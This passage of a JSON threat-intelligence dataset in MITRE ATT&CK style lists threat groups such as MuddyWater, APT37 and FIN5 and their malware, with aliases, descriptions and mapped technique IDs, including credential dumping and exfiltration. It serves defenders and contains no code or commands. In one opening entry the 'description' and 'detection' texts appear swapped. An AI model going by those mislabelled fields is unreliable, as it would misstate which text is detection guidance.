                "description": "With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\n\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ",
                "detection": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. \n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0208",
            "type": "tool",
            "attributes": {
                "name": "Pasam",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pasam is a trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1070.004": "File Deletion",
                    "T1547.008": "LSASS Driver",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1005": "Data from Local System"
                }
            },
            "val": 8
        },
        {
            "id": "S0206",
            "type": "tool",
            "attributes": {
                "name": "Wiarp",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Wiarp is a trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1055": "Process Injection",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 5
        },
        {
            "id": "S0210",
            "type": "tool",
            "attributes": {
                "name": "Nerex",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Nerex is a Trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1553.002": "Code Signing",
                    "T1543.003": "Windows Service",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 4
        },
        {
            "id": "S0207",
            "type": "tool",
            "attributes": {
                "name": "Vasport",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Vasport is a trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy"
                }
            },
            "val": 4
        },
        {
            "id": "G0069",
            "type": "group",
            "attributes": {
                "val": 11,
                "name": "MuddyWater",
                "aliases": [
                    "Earth Vetala ",
                    "MERCURY",
                    "Static Kitten",
                    "Seedworm",
                    "TEMP.Zagros"
                ],
                "description": "MuddyWater is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to FIN7, but the group is believed to be a distinct group possibly motivated by espionage.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0594": "Out1",
                    "S0592": "RemoteUtilities",
                    "S0591": "ConnectWise",
                    "S0488": "CrackMapExec",
                    "S0450": "SHARPSTATS",
                    "S0363": "Empire",
                    "S0349": "LaZagne",
                    "S0250": "Koadic",
                    "S0223": "POWERSTATS",
                    "S0194": "PowerSploit",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1589.002": "Email Addresses",
                    "T1588.002": "Tool",
                    "T1583.006": "Web Services",
                    "T1059.007": "JavaScript",
                    "T1027.004": "Compile After Delivery",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1090.002": "External Proxy",
                    "T1102.002": "Bidirectional Communication",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1087.002": "Domain Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1560.001": "Archive via Utility",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1559.001": "Component Object Model",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.003": "Steganography",
                    "T1552.001": "Credentials In Files",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1218.003": "CMSTP",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1137.001": "Office Template Macros",
                    "T1518": "Software Discovery",
                    "T1219": "Remote Access Software",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1104": "Multi-Stage Channels",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "S0594",
            "type": "tool",
            "attributes": {
                "name": "Out1",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Out1 is a remote access tool written in python and used by MuddyWater since at least 2021.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1114.001": "Local Email Collection",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 5
        },
        {
            "id": "S0592",
            "type": "tool",
            "attributes": {
                "name": "RemoteUtilities",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "RemoteUtilities is a legitimate remote administration tool that has been used by MuddyWater since at least 2021 for execution on target machines.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1218.007": "Msiexec",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "S0450",
            "type": "tool",
            "attributes": {
                "name": "SHARPSTATS",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SHARPSTATS is a .NET backdoor used by MuddyWater since at least 2019.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 7
        },
        {
            "id": "S0223",
            "type": "tool",
            "attributes": {
                "name": "POWERSTATS",
                "aliases": [
                    "Powermud"
                ],
                "labels": [
                    "malware"
                ],
                "description": "POWERSTATS is a PowerShell-based first stage backdoor used by MuddyWater.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1132.001": "Standard Encoding",
                    "T1090.002": "External Proxy",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1087.001": "Local Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1559.001": "Component Object Model",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.001": "Binary Padding",
                    "T1070.004": "File Deletion",
                    "T1218.005": "Mshta",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 29
        },
        {
            "id": "G0067",
            "type": "group",
            "attributes": {
                "val": 11,
                "name": "APT37",
                "aliases": [
                    "ScarCruft",
                    "Reaper",
                    "Group123",
                    "TEMP.Reaper"
                ],
                "description": "APT37 is a suspected North Korean cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. APT37 has also been linked to following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, Northern Korean Human Rights, and Evil New Year 2018.   \n\nNorth Korean group definitions are known to have significant overlap, and the name Lazarus Group is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, APT37, and APT38 separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0355": "Final1stspy",
                    "S0240": "ROKRAT",
                    "S0247": "NavRAT",
                    "S0218": "SLOWDRIFT",
                    "S0212": "CORALDECK",
                    "S0213": "DOGCALL",
                    "S0215": "KARAE",
                    "S0216": "POORAIM",
                    "S0219": "WINERACK",
                    "S0214": "HAPPYWORK",
                    "S0217": "SHUTTERSPEED"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1561.002": "Disk Structure Wipe",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1036.001": "Invalid Code Signature",
                    "T1027.003": "Steganography",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1529": "System Shutdown/Reboot",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1123": "Audio Capture",
                    "T1120": "Peripheral Device Discovery",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0355",
            "type": "tool",
            "attributes": {
                "name": "Final1stspy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Final1stspy is a dropper family that has been used to deliver DOGCALL.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "S0240",
            "type": "tool",
            "attributes": {
                "name": "ROKRAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ROKRAT is a cloud-based remote access tool (RAT) used by APT37. This software has been used to target victims in South Korea. APT37 used ROKRAT during several campaigns in 2016 through 2018.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1071.001": "Web Protocols",
                    "T1102.002": "Bidirectional Communication",
                    "T1497.001": "System Checks",
                    "T1518.001": "Security Software Discovery",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 17
        },
        {
            "id": "S0247",
            "type": "tool",
            "attributes": {
                "name": "NavRAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NavRAT is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection"
                }
            },
            "val": 9
        },
        {
            "id": "S0218",
            "type": "tool",
            "attributes": {
                "name": "SLOWDRIFT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SLOWDRIFT is a backdoor used by APT37 against academic and strategic victims in South Korea.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "S0212",
            "type": "tool",
            "attributes": {
                "name": "CORALDECK",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CORALDECK is an exfiltration tool used by APT37.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1560.001": "Archive via Utility",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "S0213",
            "type": "tool",
            "attributes": {
                "name": "DOGCALL",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DOGCALL is a backdoor used by APT37 that has been used to target South Korean government and military organizations in 2017. It is typically dropped using a Hangul Word Processor (HWP) exploit.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1056.001": "Keylogging",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "S0215",
            "type": "tool",
            "attributes": {
                "name": "KARAE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "KARAE is a backdoor typically used by APT37 as first-stage malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1189": "Drive-by Compromise",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "S0216",
            "type": "tool",
            "attributes": {
                "name": "POORAIM",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "POORAIM is a backdoor used by APT37 in campaigns since at least 2014.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1189": "Drive-by Compromise",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0219",
            "type": "tool",
            "attributes": {
                "name": "WINERACK",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "WINERACK is a backdoor used by APT37.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1010": "Application Window Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 7
        },
        {
            "id": "S0214",
            "type": "tool",
            "attributes": {
                "name": "HAPPYWORK",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HAPPYWORK is a downloader used by APT37 to target South Korean government and financial victims in November 2016.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "S0217",
            "type": "tool",
            "attributes": {
                "name": "SHUTTERSPEED",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SHUTTERSPEED is a backdoor used by APT37.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "G0065",
            "type": "group",
            "attributes": {
                "val": 12,
                "name": "Leviathan",
                "aliases": [
                    "TEMP.Jumper",
                    "APT40",
                    "TEMP.Periscope"
                ],
                "description": "Leviathan is a cyber espionage group that has been active since at least 2013. The group generally targets defense and government organizations, but has also targeted a range of industries including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities in the United States, Western Europe, and along the South China Sea.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0233": "MURKYTOP",
                    "S0228": "NanHaiShu",
                    "S0229": "Orz",
                    "S0232": "HOMEFRY",
                    "S0190": "BITSAdmin",
                    "S0154": "Cobalt Strike",
                    "S0110": "at",
                    "S0069": "BLACKCOFFEE",
                    "S0039": "Net",
                    "S0021": "Derusbi",
                    "S0020": "China Chopper",
                    "S0005": "Windows Credential Editor"
                },
                "techniques": {
                    "T1102.003": "One-Way Communication",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1567.002": "Exfiltration to Cloud Storage",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1003.001": "LSASS Memory",
                    "T1021.004": "SSH",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1553.002": "Code Signing",
                    "T1027.001": "Binary Padding",
                    "T1547.009": "Shortcut Modification",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1505.003": "Web Shell",
                    "T1197": "BITS Jobs",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "S0233",
            "type": "tool",
            "attributes": {
                "name": "MURKYTOP",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MURKYTOP is a reconnaissance tool used by Leviathan.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1087.001": "Local Account",
                    "T1070.004": "File Deletion",
                    "T1053.002": "At (Windows)",
                    "T1135": "Network Share Discovery",
                    "T1082": "System Information Discovery",
                    "T1069": "Permission Groups Discovery",
                    "T1046": "Network Service Scanning",
                    "T1018": "Remote System Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "S0228",
            "type": "tool",
            "attributes": {
                "name": "NanHaiShu",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NanHaiShu is a remote access tool and JScript backdoor used by Leviathan. NanHaiShu has been used to target government and private-sector organizations that have relations to the South China Sea dispute.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1071.004": "DNS",
                    "T1059.005": "Visual Basic",
                    "T1562.001": "Disable or Modify Tools",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 12
        },
        {
            "id": "S0229",
            "type": "tool",
            "attributes": {
                "name": "Orz",
                "aliases": [
                    "AIRBREAK"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Orz is a custom JavaScript backdoor used by Leviathan. It was observed being used in 2014 as well as in August 2017 when it was dropped by Microsoft Publisher files.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell",
                    "T1218.010": "Regsvr32",
                    "T1055.012": "Process Hollowing",
                    "T1518": "Software Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 12
        },
        {
            "id": "S0232",
            "type": "tool",
            "attributes": {
                "name": "HOMEFRY",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HOMEFRY is a 64-bit Windows password dumper/cracker that has previously been used in conjunction with other Leviathan backdoors.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1027": "Obfuscated Files or Information",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 3
        },
        {
            "id": "G0056",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "PROMETHIUM",
                "aliases": [
                    "StrongPity"
                ],
                "description": "PROMETHIUM is an activity group focused on espionage that has been active since at least 2012. The group has conducted operations globally with a heavy emphasis on Turkish targets. PROMETHIUM has demonstrated similarity to another activity group called NEODYMIUM due to overlapping victim and campaign characteristics.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0491": "StrongPity",
                    "S0178": "Truvasys"
                },
                "techniques": {
                    "T1587.003": "Digital Certificates",
                    "T1587.002": "Code Signing Certificates",
                    "T1205.001": "Port Knocking",
                    "T1078.003": "Local Accounts",
                    "T1204.002": "Malicious File",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1189": "Drive-by Compromise"
                }
            }
        },
        {
            "id": "S0491",
            "type": "tool",
            "attributes": {
                "name": "StrongPity",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "StrongPity is an information stealing malware used by PROMETHIUM.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1090.003": "Multi-hop Proxy",
                    "T1571": "Non-Standard Port",
                    "T1564.003": "Hidden Window",
                    "T1204.002": "Malicious File",
                    "T1569.002": "Service Execution",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.003": "Archive via Custom Method",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1119": "Automated Collection",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 26
        },
        {
            "id": "S0178",
            "type": "tool",
            "attributes": {
                "name": "Truvasys",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Truvasys is first-stage malware that has been used by PROMETHIUM. It is a collection of modules written in the Delphi programming language.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1036.004": "Masquerade Task or Service",
                    "T1547.001": "Registry Run Keys / Startup Folder"
                }
            },
            "val": 2
        },
        {
            "id": "G0054",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Sowbug",
                "aliases": [],
                "description": "Sowbug is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0171": "Felismus",
                    "S0188": "Starloader"
                },
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1560.001": "Archive via Utility",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1135": "Network Share Discovery",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1039": "Data from Network Shared Drive",
                    "T1003": "OS Credential Dumping"
                }
            }
        },
        {
            "id": "S0171",
            "type": "tool",
            "attributes": {
                "name": "Felismus",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Felismus is a modular backdoor that has been used by Sowbug.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0188",
            "type": "tool",
            "attributes": {
                "name": "Starloader",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Starloader is a loader component that has been observed loading Felismus and associated tools.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1140": "Deobfuscate/Decode Files or Information"
                }
            },
            "val": 2
        },
        {
            "id": "G0052",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "CopyKittens",
                "aliases": [],
                "description": "CopyKittens is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire",
                    "S0167": "Matryoshka",
                    "S0164": "TDTESS",
                    "S0154": "Cobalt Strike"
                },
                "techniques": {
                    "T1564.003": "Hidden Window",
                    "T1059.001": "PowerShell",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.001": "Archive via Utility",
                    "T1553.002": "Code Signing",
                    "T1218.011": "Rundll32"
                }
            }
        },
        {
            "id": "S0167",
            "type": "tool",
            "attributes": {
                "name": "Matryoshka",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Matryoshka is a malware framework used by CopyKittens that consists of a dropper, loader, and RAT. It has multiple versions; v1 was seen in the wild from July 2016 until January 2017. v2 has fewer commands and other minor differences.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1053.005": "Scheduled Task",
                    "T1113": "Screen Capture",
                    "T1059": "Command and Scripting Interpreter",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 10
        },
        {
            "id": "S0164",
            "type": "tool",
            "attributes": {
                "name": "TDTESS",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TDTESS is a 64-bit .NET binary backdoor used by CopyKittens.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 5
        },
        {
            "id": "G0053",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "FIN5",
                "aliases": [],
                "description": "FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0195": "SDelete",
                    "S0173": "FLIPSIDE",
                    "S0169": "RawPOS",
                    "S0029": "PsExec",
                    "S0006": "pwdump",
                    "S0005": "Windows Credential Editor"
                },
                "techniques": {
                    "T1090.002": "External Proxy",
                    "T1074.001": "Local Data Staging",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1133": "External Remote Services",
                    "T1119": "Automated Collection",
                    "T1110": "Brute Force",
                    "T1078": "Valid Accounts",
                    "T1059": "Command and Scripting Interpreter",
                    "T1018": "Remote System Discovery"
                }
            }
        },
        {
            "id": "S0173",
            "type": "tool",
            "attributes": {
                "name": "FLIPSIDE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "FLIPSIDE is a simple tool similar to Plink that is used by FIN5 to maintain access to victims.",
                "platforms": [
                    "Windows"
